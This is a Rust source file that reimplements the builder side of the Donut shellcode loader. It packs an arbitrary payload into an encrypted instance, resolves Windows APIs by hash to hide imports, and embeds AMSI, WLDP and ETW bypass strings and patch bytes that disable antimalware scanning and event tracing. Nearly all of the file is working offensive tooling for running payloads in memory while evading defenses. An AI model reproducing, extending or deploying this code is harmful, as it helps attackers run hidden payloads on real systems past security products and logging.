//! Donut-compatible instance builder
//! Creates DONUT_INSTANCE and DONUT_MODULE structures that the loader expects

use rand::Rng;

// Constants from donut.h
pub const DONUT_KEY_LEN: usize = 16;
pub const DONUT_BLK_LEN: usize = 16;
pub const DONUT_MAX_NAME: usize = 256;
pub const DONUT_SIG_LEN: usize = 8;
pub const DONUT_VER_LEN: usize = 32;
pub const MAX_PATH: usize = 260;

// DLL name strings
pub const KERNEL32_DLL: &str = "kernel32.dll";
pub const SHELL32_DLL: &str = "shell32.dll";
pub const OLEAUT32_DLL: &str = "oleaut32.dll";
pub const WININET_DLL: &str = "wininet.dll";
pub const MSCOREE_DLL: &str = "mscoree.dll";
pub const OLE32_DLL: &str = "ole32.dll";
pub const NTDLL_DLL: &str = "ntdll.dll";

// DLL names to load (semicolon separated) - from donut.c
pub const DLL_NAMES: &str = "ole32;oleaut32;wininet;mscoree;shell32";

// Module types
pub const DONUT_MODULE_NET_DLL: i32 = 1;
pub const DONUT_MODULE_NET_EXE: i32 = 2;
pub const DONUT_MODULE_DLL: i32 = 3;
pub const DONUT_MODULE_EXE: i32 = 4;
pub const DONUT_MODULE_VBS: i32 = 5;
pub const DONUT_MODULE_JS: i32 = 6;

// Instance types
pub const DONUT_INSTANCE_EMBED: i32 = 1;
pub const DONUT_INSTANCE_HTTP: i32 = 2;

// Entropy levels
pub const DONUT_ENTROPY_NONE: i32 = 1;
pub const DONUT_ENTROPY_RANDOM: i32 = 2;
pub const DONUT_ENTROPY_DEFAULT: i32 = 3;

// Exit options
pub const DONUT_OPT_EXIT_THREAD: i32 = 1;
pub const DONUT_OPT_EXIT_PROCESS: i32 = 2;
pub const DONUT_OPT_EXIT_BLOCK: i32 = 3;

// Bypass options
pub const DONUT_BYPASS_NONE: i32 = 1;
pub const DONUT_BYPASS_ABORT: i32 = 2;
pub const DONUT_BYPASS_CONTINUE: i32 = 3;

// Compression
pub const DONUT_COMPRESS_NONE: i32 = 1;
pub const DONUT_COMPRESS_APLIB: i32 = 2;

// Headers
pub const DONUT_HEADERS_OVERWRITE: i32 = 1;
pub const DONUT_HEADERS_KEEP: i32 = 2;

/// GUID structure (16 bytes)
#[repr(C)]
#[derive(Clone, Copy, Default)]
pub struct Guid {
    pub data1: u32,
    pub data2: u16,
    pub data3: u16,
    pub data4: [u8; 8],
}

/// Encryption key structure
#[repr(C)]
#[derive(Clone, Copy)]
pub struct DonutCrypt {
    pub mk: [u8; DONUT_KEY_LEN],   // master key
    pub ctr: [u8; DONUT_BLK_LEN],  // counter + nonce
}

impl Default for DonutCrypt {
    fn default() -> Self {
        Self {
            mk: [0u8; DONUT_KEY_LEN],
            ctr: [0u8; DONUT_BLK_LEN],
        }
    }
}

/// API hashes union - 64 entries * 8 bytes = 512 bytes
#[repr(C)]
#[derive(Clone, Copy)]
pub struct ApiHashes {
    pub hash: [u64; 64],
}

impl Default for ApiHashes {
    fn default() -> Self {
        Self { hash: [0u64; 64] }
    }
}

/// DONUT_MODULE structure - must match C layout exactly
#[repr(C)]
pub struct DonutModule {
    pub mod_type: i32,                        // EXE/DLL/JS/VBS
    pub thread: i32,                          // run entrypoint as thread
    pub compress: i32,                        // compression engine used
    
    pub runtime: [u8; DONUT_MAX_NAME],        // runtime version for .NET
    pub domain: [u8; DONUT_MAX_NAME],         // domain name for .NET
    pub cls: [u8; DONUT_MAX_NAME],            // class name for .NET
    pub method: [u8; DONUT_MAX_NAME],         // method name
    
    pub args: [u8; DONUT_MAX_NAME],           // string arguments
    pub unicode: i32,                         // convert to unicode
    
    pub sig: [u8; DONUT_SIG_LEN],             // signature to verify decryption
    pub mac: u64,                             // hash of sig
    
    pub zlen: u32,                            // compressed size
    pub len: u32,                             // original size
    
    // In C this is: union { PBYTE p; BYTE x[8]; } data;
    // The x[8] is where the actual payload data starts
    pub data: [u8; 8],                        // start of payload data
}

/// DONUT_INSTANCE structure - must match C layout exactly
#[repr(C)]
pub struct DonutInstance {
    pub len: u32,                             // total size of instance
    pub key: DonutCrypt,                      // decryption key
    
    pub iv: u64,                              // 64-bit initial value for maru hash
    
    pub api: ApiHashes,                       // 64 API hashes (512 bytes)
    
    pub exit_opt: i32,                        // exit option
    pub entropy: i32,                         // entropy level
    pub oep: u32,                             // original entry point
    
    // Everything from here is encrypted when entropy == DEFAULT
    pub api_cnt: i32,                         // number of API hashes
    pub dll_names: [u8; DONUT_MAX_NAME],      // DLL names separated by ;
    
    pub dataname: [u8; 8],                    // ".data"
    pub kernelbase: [u8; 12],                 // "kernelbase"
    pub amsi: [u8; 8],                        // "amsi"
    pub clr: [u8; 4],                         // "clr"
    pub wldp: [u8; 8],                        // "wldp"
    pub ntdll: [u8; 8],                       // "ntdll"
    
    pub cmd_syms: [u8; DONUT_MAX_NAME],       // command line symbols
    pub exit_api: [u8; DONUT_MAX_NAME],       // exit API names
    
    pub bypass: i32,                          // bypass option
    pub headers: i32,                         // headers option
    pub wldp_query: [u8; 32],                 // WldpQueryDynamicCodeTrust
    pub wldp_is_approved: [u8; 32],           // WldpIsClassInApprovedList
    pub amsi_init: [u8; 16],                  // AmsiInitialize
    pub amsi_scan_buf: [u8; 16],              // AmsiScanBuffer
    pub amsi_scan_str: [u8; 16],              // AmsiScanString
    pub etw_event_write: [u8; 16],            // EtwEventWrite
    pub etw_event_unregister: [u8; 20],       // EtwEventUnregister
    pub etw_ret64: [u8; 1],                   // ret for 64-bit
    pub etw_ret32: [u8; 4],                   // ret 14h for 32-bit
    
    pub wscript: [u8; 8],                     // WScript
    pub wscript_exe: [u8; 12],                // wscript.exe
    
    pub decoy: [u8; 520],                     // MAX_PATH * 2
    
    // GUIDs for COM
    pub x_iid_iunknown: Guid,
    pub x_iid_idispatch: Guid,
    
    // GUIDs for .NET
    pub x_clsid_clr_meta_host: Guid,
    pub x_iid_iclr_meta_host: Guid,
    pub x_iid_iclr_runtime_info: Guid,
    pub x_clsid_cor_runtime_host: Guid,
    pub x_iid_icor_runtime_host: Guid,
    pub x_iid_app_domain: Guid,
    
    // GUIDs for scripting
    pub x_clsid_script_language: Guid,
    pub x_iid_ihost: Guid,
    pub x_iid_iactive_script: Guid,
    pub x_iid_iactive_script_site: Guid,
    pub x_iid_iactive_script_site_window: Guid,
    pub x_iid_iactive_script_parse32: Guid,
    pub x_iid_iactive_script_parse64: Guid,
    
    pub inst_type: i32,                       // EMBED or HTTP
    pub server: [u8; DONUT_MAX_NAME],         // server URL
    pub username: [u8; DONUT_MAX_NAME],       // auth username
    pub password: [u8; DONUT_MAX_NAME],       // auth password
    pub http_req: [u8; 8],                    // "GET"
    
    pub sig: [u8; DONUT_MAX_NAME],            // signature
    pub mac: u64,                             // MAC to verify decryption
    
    pub mod_key: DonutCrypt,                  // key to decrypt module
    pub mod_len: u64,                         // module length
    
    // Module is embedded here when inst_type == EMBED
    // In C this is: union { PDONUT_MODULE p; DONUT_MODULE x; } module;
    // The union is the size of DonutModule (1328 bytes)
    pub module: DonutModule,                  // embedded module (1328 bytes)
}

/// Build the donut module structure
pub fn build_donut_module(
    payload: &[u8],
    mod_type: i32,
    runtime: &str,
    domain: &str,
    class: &str,
    method: &str,
    args: &str,
    iv: u64,  // IV for MAC computation
) -> Vec<u8> {
    let mut rng = rand::thread_rng();
    
    // Generate random signature (printable ASCII, null-terminated)
    let mut sig = [0u8; DONUT_SIG_LEN];
    let sig_chars = b"HMN34P67R9TWCXYF";
    for i in 0..(DONUT_SIG_LEN - 1) {
        sig[i] = sig_chars[rng.gen::<usize>() % sig_chars.len()];
    }
    sig[DONUT_SIG_LEN - 1] = 0; // null terminate within 8-byte field
    
    // Calculate MAC (maru hash of signature with IV)
    let mac = maru_hash(&sig, iv);
    
    // Build module header
    let header_size = std::mem::size_of::<DonutModule>();
    // Payload starts at the data field within the module, not after it
    // In C: memcpy(mod->data.x, payload, payload_len)
    let data_offset = std::mem::offset_of!(DonutModule, data);
    let total_size = data_offset + payload.len();
    
    let mut module_data = vec![0u8; total_size];
    
    // Fill module structure
    unsafe {
        let module = &mut *(module_data.as_mut_ptr() as *mut DonutModule);
        
        module.mod_type = mod_type;
        module.thread = 0;
        module.compress = DONUT_COMPRESS_NONE;
        
        copy_str_to_array(&mut module.runtime, runtime);
        copy_str_to_array(&mut module.domain, domain);
        copy_str_to_array(&mut module.cls, class);
        copy_str_to_array(&mut module.method, method);
        copy_str_to_array(&mut module.args, args);
        
        module.unicode = 0;
        module.sig = sig;
        module.mac = mac;
        module.zlen = payload.len() as u32;
        module.len = payload.len() as u32;
    }
    
    // Copy payload starting at data.x field (not after full struct)
    // In C: memcpy(mod->data.x, payload, payload_len)
    module_data[data_offset..].copy_from_slice(payload);
    
    module_data
}

/// Build the donut instance structure
pub fn build_donut_instance(
    module_data: &[u8],
    api_hashes: &[u64],
    iv: u64,  // Must be the same IV used to generate api_hashes!
    entropy: i32,
    exit_opt: i32,
    bypass: i32,
    _is_dotnet: bool,
) -> Vec<u8> {
    let mut rng = rand::thread_rng();
    
    let instance_size = std::mem::size_of::<DonutInstance>();
    // Module data goes at offset 3424 (module.x field inside instance)
    // In C: offsetof(DONUT_INSTANCE, module.x) = 3424
    let module_offset = 3424usize;
    // Total size is either the full instance struct OR enough to hold all module data
    let total_size = std::cmp::max(instance_size, module_offset + module_data.len());
    
    let mut instance_data = vec![0u8; total_size];
    
    // Generate keys
    let mut master_key = [0u8; DONUT_KEY_LEN];
    let mut ctr = [0u8; DONUT_BLK_LEN];
    let mut mod_key = [0u8; DONUT_KEY_LEN];
    let mut mod_ctr = [0u8; DONUT_BLK_LEN];
    
    if entropy == DONUT_ENTROPY_DEFAULT {
        rng.fill(&mut master_key);
        rng.fill(&mut ctr);
        rng.fill(&mut mod_key);
        rng.fill(&mut mod_ctr);
    }
    
    // Generate instance signature (printable ASCII, null-terminated)
    let mut sig = [0u8; DONUT_MAX_NAME];
    let sig_chars = b"HMN34P67R9TWCXYF";
    for i in 0..DONUT_SIG_LEN {
        sig[i] = sig_chars[rng.gen::<usize>() % sig_chars.len()];
    }
    sig[DONUT_SIG_LEN] = 0; // null terminate
    let mac = maru_hash(&sig, iv);
    
    unsafe {
        let inst = &mut *(instance_data.as_mut_ptr() as *mut DonutInstance);
        
        inst.len = total_size as u32;
        inst.key.mk = master_key;
        inst.key.ctr = ctr;
        inst.iv = iv;  // Use the IV passed in!
        
        // Copy API hashes
        for (i, &hash) in api_hashes.iter().enumerate().take(64) {
            inst.api.hash[i] = hash;
        }
        
        inst.exit_opt = exit_opt;
        inst.entropy = entropy;
        inst.oep = 0;
        
        inst.api_cnt = api_hashes.len() as i32;
        
        // DLL names - must match donut.c DLL_NAMES exactly
        copy_str_to_array(&mut inst.dll_names, DLL_NAMES);
        
        // String constants
        copy_str_to_array(&mut inst.dataname, ".data");
        copy_str_to_array(&mut inst.kernelbase, "kernelbase");
        copy_str_to_array(&mut inst.amsi, "amsi");
        copy_str_to_array(&mut inst.clr, "clr");
        copy_str_to_array(&mut inst.wldp, "wldp");
        copy_str_to_array(&mut inst.ntdll, "ntdll");
        
        // Exit API
        copy_str_to_array(&mut inst.exit_api, "ntdll.dll;RtlExitUserThread;RtlExitUserProcess");
        
        inst.bypass = bypass;
        inst.headers = DONUT_HEADERS_OVERWRITE;
        
        // AMSI/WLDP bypass strings
        copy_str_to_array(&mut inst.wldp_query, "WldpQueryDynamicCodeTrust");
        copy_str_to_array(&mut inst.wldp_is_approved, "WldpIsClassInApprovedList");
        copy_str_to_array(&mut inst.amsi_init, "AmsiInitialize");
        copy_str_to_array(&mut inst.amsi_scan_buf, "AmsiScanBuffer");
        copy_str_to_array(&mut inst.amsi_scan_str, "AmsiScanString");
        copy_str_to_array(&mut inst.etw_event_write, "EtwEventWrite");
        copy_str_to_array(&mut inst.etw_event_unregister, "EtwEventUnregister");
        inst.etw_ret64[0] = 0xC3; // ret
        inst.etw_ret32 = [0xC2, 0x14, 0x00, 0x00]; // ret 14h
        
        copy_str_to_array(&mut inst.wscript, "WScript");
        copy_str_to_array(&mut inst.wscript_exe, "wscript.exe");
        
        // GUIDs - IUnknown
        inst.x_iid_iunknown = Guid {
            data1: 0x00000000,
            data2: 0x0000,
            data3: 0x0000,
            data4: [0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46],
        };
        
        // IDispatch
        inst.x_iid_idispatch = Guid {
            data1: 0x00020400,
            data2: 0x0000,
            data3: 0x0000,
            data4: [0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46],
        };
        
        // CLRMetaHost CLSID
        inst.x_clsid_clr_meta_host = Guid {
            data1: 0x9280188D,
            data2: 0x0E8E,
            data3: 0x4867,
            data4: [0xB3, 0x0C, 0x7F, 0xA8, 0x38, 0x84, 0xE8, 0xDE],
        };
        
        // ICLRMetaHost IID
        inst.x_iid_iclr_meta_host = Guid {
            data1: 0xD332DB9E,
            data2: 0xB9B3,
            data3: 0x4125,
            data4: [0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16],
        };
        
        // ICLRRuntimeInfo IID
        inst.x_iid_iclr_runtime_info = Guid {
            data1: 0xBD39D1D2,
            data2: 0xBA2F,
            data3: 0x486A,
            data4: [0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91],
        };
        
        // CorRuntimeHost CLSID
        inst.x_clsid_cor_runtime_host = Guid {
            data1: 0xCB2F6723,
            data2: 0xAB3A,
            data3: 0x11D2,
            data4: [0x9C, 0x40, 0x00, 0xC0, 0x4F, 0xA3, 0x0A, 0x3E],
        };
        
        // ICorRuntimeHost IID
        inst.x_iid_icor_runtime_host = Guid {
            data1: 0xCB2F6722,
            data2: 0xAB3A,
            data3: 0x11D2,
            data4: [0x9C, 0x40, 0x00, 0xC0, 0x4F, 0xA3, 0x0A, 0x3E],
        };
        
        // AppDomain IID
        inst.x_iid_app_domain = Guid {
            data1: 0x05F696DC,
            data2: 0x2B29,
            data3: 0x3663,
            data4: [0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13],
        };
        
        inst.inst_type = DONUT_INSTANCE_EMBED;
        copy_str_to_array(&mut inst.http_req, "GET");
        
        inst.sig = sig;
        inst.mac = mac;
        
        inst.mod_key.mk = mod_key;
        inst.mod_key.ctr = mod_ctr;
        inst.mod_len = module_data.len() as u64;
    }
    
    // Copy module data to the embedded module location (offset of `module` field)
    // This is where the C code does: memcpy(&inst->module.x, mod, mod_len)
    let module_offset = std::mem::offset_of!(DonutInstance, module);
    instance_data[module_offset..module_offset + module_data.len()].copy_from_slice(module_data);
    
    // Encrypt if needed
    if entropy == DONUT_ENTROPY_DEFAULT {
        // Encrypt module with mod_key (starts at module_offset)
        chaskey_ctr_encrypt(&mod_key, &mut mod_ctr.clone(), &mut instance_data[module_offset..module_offset + module_data.len()]);
        
        // Encrypt instance (from api_cnt to end of module data) with master key
        let enc_start = std::mem::offset_of!(DonutInstance, api_cnt);
        let enc_end = module_offset + module_data.len();
        chaskey_ctr_encrypt(&master_key, &mut ctr.clone(), &mut instance_data[enc_start..enc_end]);
    }
    
    instance_data
}

/// Copy string to fixed-size array
fn copy_str_to_array(arr: &mut [u8], s: &str) {
    let bytes = s.as_bytes();
    let len = bytes.len().min(arr.len() - 1);
    arr[..len].copy_from_slice(&bytes[..len]);
    arr[len] = 0;
}

/// Maru hash function - based on SPECK-64/128
pub fn maru_hash(input: &[u8], iv: u64) -> u64 {
    const MARU_MAX_STR: usize = 64;
    const MARU_BLK_LEN: usize = 16;
    
    let mut h = iv;
    let mut m = [0u8; MARU_BLK_LEN];
    let mut idx = 0usize;
    let mut len = 0usize;
    let mut end = false;
    
    while !end {
        // end of string or max len?
        if len >= input.len() || input[len] == 0 || len == MARU_MAX_STR {
            // zero remainder of M
            for i in idx..MARU_BLK_LEN {
                m[i] = 0;
            }
            // store the end bit
            m[idx] = 0x80;
            // have we space in M for api length?
            if idx >= MARU_BLK_LEN - 4 {
                // no, update H with E
                h ^= speck(&m, h);
                // zero M
                m = [0u8; MARU_BLK_LEN];
            }
            // store total length in bits (32-bit little endian at end)
            let len_bits = (len as u32) * 8;
            m[MARU_BLK_LEN - 4..].copy_from_slice(&len_bits.to_le_bytes());
            idx = MARU_BLK_LEN;
            end = true;
        } else {
            // store character from api string
            m[idx] = input[len];
            idx += 1;
            len += 1;
        }
        if idx == MARU_BLK_LEN {
            // update H with E
            h ^= speck(&m, h);
            // reset idx
            idx = 0;
        }
    }
    
    h
}

/// SPECK-64/128 block cipher
fn speck(mk: &[u8; 16], p: u64) -> u64 {
    let mut k = [
        u32::from_le_bytes([mk[0], mk[1], mk[2], mk[3]]),
        u32::from_le_bytes([mk[4], mk[5], mk[6], mk[7]]),
        u32::from_le_bytes([mk[8], mk[9], mk[10], mk[11]]),
        u32::from_le_bytes([mk[12], mk[13], mk[14], mk[15]]),
    ];
    
    let mut x = [
        (p & 0xFFFFFFFF) as u32,
        ((p >> 32) & 0xFFFFFFFF) as u32,
    ];
    
    for i in 0..27u32 {
        // encrypt 64-bit plaintext
        x[0] = (x[0].rotate_right(8).wrapping_add(x[1])) ^ k[0];
        x[1] = x[1].rotate_left(3) ^ x[0];
        
        // create next 32-bit subkey
        let t = k[3];
        k[3] = (k[1].rotate_right(8).wrapping_add(k[0])) ^ i;
        k[0] = k[0].rotate_left(3) ^ k[3];
        k[1] = k[2];
        k[2] = t;
    }
    
    ((x[1] as u64) << 32) | (x[0] as u64)
}

/// Chaskey block cipher encryption
fn chaskey_encrypt(key: &[u8; 16], block: &mut [u8; 16]) {
    let mut v = [
        u32::from_le_bytes([block[0], block[1], block[2], block[3]]),
        u32::from_le_bytes([block[4], block[5], block[6], block[7]]),
        u32::from_le_bytes([block[8], block[9], block[10], block[11]]),
        u32::from_le_bytes([block[12], block[13], block[14], block[15]]),
    ];
    
    let k = [
        u32::from_le_bytes([key[0], key[1], key[2], key[3]]),
        u32::from_le_bytes([key[4], key[5], key[6], key[7]]),
        u32::from_le_bytes([key[8], key[9], key[10], key[11]]),
        u32::from_le_bytes([key[12], key[13], key[14], key[15]]),
    ];
    
    // Add key
    for i in 0..4 {
        v[i] ^= k[i];
    }
    
    // 16 rounds
    for _ in 0..16 {
        v[0] = v[0].wrapping_add(v[1]);
        v[1] = v[1].rotate_left(5) ^ v[0];
        v[0] = v[0].rotate_left(16);
        
        v[2] = v[2].wrapping_add(v[3]);
        v[3] = v[3].rotate_left(8) ^ v[2];
        
        v[0] = v[0].wrapping_add(v[3]);
        v[3] = v[3].rotate_left(13) ^ v[0];
        
        v[2] = v[2].wrapping_add(v[1]);
        v[1] = v[1].rotate_left(7) ^ v[2];
        v[2] = v[2].rotate_left(16);
    }
    
    // Add key again
    for i in 0..4 {
        v[i] ^= k[i];
    }
    
    // Write back
    block[0..4].copy_from_slice(&v[0].to_le_bytes());
    block[4..8].copy_from_slice(&v[1].to_le_bytes());
    block[8..12].copy_from_slice(&v[2].to_le_bytes());
    block[12..16].copy_from_slice(&v[3].to_le_bytes());
}

/// Chaskey CTR mode encryption
fn chaskey_ctr_encrypt(key: &[u8; 16], ctr: &mut [u8; 16], data: &mut [u8]) {
    let mut block = [0u8; 16];
    
    for chunk in data.chunks_mut(16) {
        block.copy_from_slice(ctr);
        chaskey_encrypt(key, &mut block);
        
        for (i, byte) in chunk.iter_mut().enumerate() {
            *byte ^= block[i];
        }
        
        // Increment counter
        for i in 0..16 {
            ctr[i] = ctr[i].wrapping_add(1);
            if ctr[i] != 0 {
                break;
            }
        }
    }
}

/// API import definition
struct ApiImport {
    module: &'static str,
    name: &'static str,
}

/// Get required API hashes for the loader - exactly matching donut.c api_imports[]
/// The hash is computed as: maru(api_name, iv) XOR maru(dll_name, iv)
pub fn get_api_hashes(iv: u64) -> Vec<u64> {
    // API imports exactly matching donut.c api_imports[] order
    let api_imports: &[ApiImport] = &[
        // Kernel32 APIs
        ApiImport { module: KERNEL32_DLL, name: "LoadLibraryA" },
        ApiImport { module: KERNEL32_DLL, name: "GetProcAddress" },
        ApiImport { module: KERNEL32_DLL, name: "GetModuleHandleA" },
        ApiImport { module: KERNEL32_DLL, name: "VirtualAlloc" },
        ApiImport { module: KERNEL32_DLL, name: "VirtualFree" },
        ApiImport { module: KERNEL32_DLL, name: "VirtualQuery" },
        ApiImport { module: KERNEL32_DLL, name: "VirtualProtect" },
        ApiImport { module: KERNEL32_DLL, name: "Sleep" },
        ApiImport { module: KERNEL32_DLL, name: "MultiByteToWideChar" },
        ApiImport { module: KERNEL32_DLL, name: "GetUserDefaultLCID" },
        ApiImport { module: KERNEL32_DLL, name: "WaitForSingleObject" },
        ApiImport { module: KERNEL32_DLL, name: "CreateThread" },
        ApiImport { module: KERNEL32_DLL, name: "CreateFileA" },
        ApiImport { module: KERNEL32_DLL, name: "GetFileSizeEx" },
        ApiImport { module: KERNEL32_DLL, name: "GetThreadContext" },
        ApiImport { module: KERNEL32_DLL, name: "GetCurrentThread" },
        ApiImport { module: KERNEL32_DLL, name: "GetCurrentProcess" },
        ApiImport { module: KERNEL32_DLL, name: "GetCommandLineA" },
        ApiImport { module: KERNEL32_DLL, name: "GetCommandLineW" },
        ApiImport { module: KERNEL32_DLL, name: "HeapAlloc" },
        ApiImport { module: KERNEL32_DLL, name: "HeapReAlloc" },
        ApiImport { module: KERNEL32_DLL, name: "GetProcessHeap" },
        ApiImport { module: KERNEL32_DLL, name: "HeapFree" },
        ApiImport { module: KERNEL32_DLL, name: "GetLastError" },
        ApiImport { module: KERNEL32_DLL, name: "CloseHandle" },
        
        // Shell32 API
        ApiImport { module: SHELL32_DLL, name: "CommandLineToArgvW" },
        
        // Oleaut32 APIs
        ApiImport { module: OLEAUT32_DLL, name: "SafeArrayCreate" },
        ApiImport { module: OLEAUT32_DLL, name: "SafeArrayCreateVector" },
        ApiImport { module: OLEAUT32_DLL, name: "SafeArrayPutElement" },
        ApiImport { module: OLEAUT32_DLL, name: "SafeArrayDestroy" },
        ApiImport { module: OLEAUT32_DLL, name: "SafeArrayGetLBound" },
        ApiImport { module: OLEAUT32_DLL, name: "SafeArrayGetUBound" },
        ApiImport { module: OLEAUT32_DLL, name: "SysAllocString" },
        ApiImport { module: OLEAUT32_DLL, name: "SysFreeString" },
        ApiImport { module: OLEAUT32_DLL, name: "LoadTypeLib" },
        
        // Wininet APIs
        ApiImport { module: WININET_DLL, name: "InternetCrackUrlA" },
        ApiImport { module: WININET_DLL, name: "InternetOpenA" },
        ApiImport { module: WININET_DLL, name: "InternetConnectA" },
        ApiImport { module: WININET_DLL, name: "InternetSetOptionA" },
        ApiImport { module: WININET_DLL, name: "InternetReadFile" },
        ApiImport { module: WININET_DLL, name: "InternetQueryDataAvailable" },
        ApiImport { module: WININET_DLL, name: "InternetCloseHandle" },
        ApiImport { module: WININET_DLL, name: "HttpOpenRequestA" },
        ApiImport { module: WININET_DLL, name: "HttpSendRequestA" },
        ApiImport { module: WININET_DLL, name: "HttpQueryInfoA" },
        
        // Mscoree APIs
        ApiImport { module: MSCOREE_DLL, name: "CorBindToRuntime" },
        ApiImport { module: MSCOREE_DLL, name: "CLRCreateInstance" },
        
        // Ole32 APIs
        ApiImport { module: OLE32_DLL, name: "CoInitializeEx" },
        ApiImport { module: OLE32_DLL, name: "CoCreateInstance" },
        ApiImport { module: OLE32_DLL, name: "CoUninitialize" },
        
        // Ntdll APIs
        ApiImport { module: NTDLL_DLL, name: "RtlEqualUnicodeString" },
        ApiImport { module: NTDLL_DLL, name: "RtlEqualString" },
        ApiImport { module: NTDLL_DLL, name: "RtlUnicodeStringToAnsiString" },
        ApiImport { module: NTDLL_DLL, name: "RtlInitUnicodeString" },
        ApiImport { module: NTDLL_DLL, name: "RtlExitUserThread" },
        ApiImport { module: NTDLL_DLL, name: "RtlExitUserProcess" },
        ApiImport { module: NTDLL_DLL, name: "RtlCreateUnicodeString" },
        ApiImport { module: NTDLL_DLL, name: "RtlGetCompressionWorkSpaceSize" },
        ApiImport { module: NTDLL_DLL, name: "RtlDecompressBuffer" },
        ApiImport { module: NTDLL_DLL, name: "NtContinue" },
        ApiImport { module: NTDLL_DLL, name: "NtCreateSection" },
        ApiImport { module: NTDLL_DLL, name: "NtMapViewOfSection" },
        ApiImport { module: NTDLL_DLL, name: "NtUnmapViewOfSection" },
    ];
    
    let mut hashes = Vec::with_capacity(api_imports.len());
    
    for api in api_imports {
        // Hash the DLL name
        let dll_hash = maru_hash(api.module.as_bytes(), iv);
        // Hash the API name and XOR with DLL hash
        let api_hash = maru_hash(api.name.as_bytes(), iv);
        hashes.push(api_hash ^ dll_hash);
    }
    
    hashes
}
